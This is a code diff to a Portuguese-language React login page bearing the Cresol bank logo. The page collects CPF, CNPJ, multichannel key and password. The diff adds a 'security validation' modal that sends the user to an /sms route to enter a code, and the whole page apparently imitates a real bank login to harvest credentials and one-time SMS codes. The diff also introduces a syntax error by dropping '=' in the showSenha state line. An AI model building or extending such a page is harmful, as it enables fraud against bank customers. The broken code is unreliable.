@@ -1,10 +1,18 @@
 import React, { useState } from "react";
 import { Eye, EyeOff, HelpCircle } from "lucide-react";
+import { useNavigate } from "react-router-dom";
 import womanImage from "/lovable-uploads/e7069972-f11c-4c5a-a081-9869f1468332.png";
 import cresolLogo from "/lovable-uploads/afc18ce7-1259-448e-9ab4-f02f2fbbaf19.png";
 import { LocationPermissionPrompt } from "@/components/LocationPermissionPrompt";
 import { VirtualKeyboardInline } from "@/components/VirtualKeyboardInline";
 import { Switch } from "@/components/ui/switch";
+import {
+  Dialog,
+  DialogContent,
+  DialogDescription,
+  DialogHeader,
+  DialogTitle,
+} from "@/components/ui/dialog";
 
 // Atualize aqui: Use título e subtítulo (duas linhas) como campos explícitos!
 const TABS = [
@@ -14,15 +22,17 @@ const TABS = [
 ];
 
 const Index = () => {
+  const navigate = useNavigate();
   const [tab, setTab] = useState("fisica");
   const [cpf, setCpf] = useState("");
   const [cnpj, setCnpj] = useState("");
   const [chaveMulticanal, setChaveMulticanal] = useState("");
   const [senha, setSenha] = useState("");
-  const [showSenha, setShowSenha] = useState(false);
+  const [showSenha, setShowSenha] useState(false);
   const [saveCpf, setSaveCpf] = useState(false);
   const [saveCnpj, setSaveCnpj] = useState(false);
   const [saveChaveMulticanal, setSaveChaveMulticanal] = useState(false);
+  const [showSmsModal, setShowSmsModal] = useState(false);
 
   // ---- Popup de permissão de localização ----
   const [showLocationPrompt, setShowLocationPrompt] = useState(true);
@@ -49,6 +59,21 @@ const Index = () => {
     setShowPasswordKeyboard(false);
     setSenhaTemp("");
   }
+
+  const handleLogin = (e: React.FormEvent) => {
+    e.preventDefault();
+    // Mostrar modal de SMS
+    setShowSmsModal(true);
+  };
+
+  const handleSmsModalClose = () => {
+    setShowSmsModal(false);
+  };
+
+  const handleSmsModalConfirm = () => {
+    setShowSmsModal(false);
+    navigate("/sms");
+  };
 
   // ---- PASSWORD INPUT (com toggle view) ----
   const senhaInput = (
@@ -184,6 +209,37 @@ const Index = () => {
         onNeverAllow={handleNeverAllow}
         topOffset={locationPromptOffset}
       />
+      
+      {/* Modal SMS */}
+      <Dialog open={showSmsModal} onOpenChange={setShowSmsModal}>
+        <DialogContent className="sm:max-w-md">
+          <DialogHeader>
+            <DialogTitle>Validação de Segurança</DialogTitle>
+            <DialogDescription>
+              Para sua segurança, enviaremos um código SMS para seu celular cadastrado.
+            </DialogDescription>
+          </DialogHeader>
+          <div className="flex flex-col gap-4 pt-4">
+            <button
+              onClick={handleSmsModalConfirm}
+              className="w-full h-11 rounded-full bg-orange-500 hover:bg-orange-600 transition font-bold text-white text-lg"
+              style={{
+                background: "linear-gradient(90deg,#ffaa00,#ff7300 100%)",
+                borderRadius: "30px",
+              }}
+            >
+              Enviar SMS
+            </button>
+            <button
+              onClick={handleSmsModalClose}
+              className="w-full h-11 rounded-full border-2 border-gray-300 text-gray-700 font-semibold text-lg transition-colors hover:bg-gray-50"
+            >
+              Cancelar
+            </button>
+          </div>
+        </DialogContent>
+      </Dialog>
+
       {/* Left: Formulário */}
       <div className="w-1/2 flex flex-col justify-center px-[7%] py-12 relative">
         <div className="max-w-md w-full mx-auto">
@@ -215,7 +271,7 @@ const Index = () => {
               </button>
             ))}
           </div>
-          <form className="mt-6">
+          <form className="mt-6" onSubmit={handleLogin}>
             {renderFormContent()}
             <button
               type="submit"
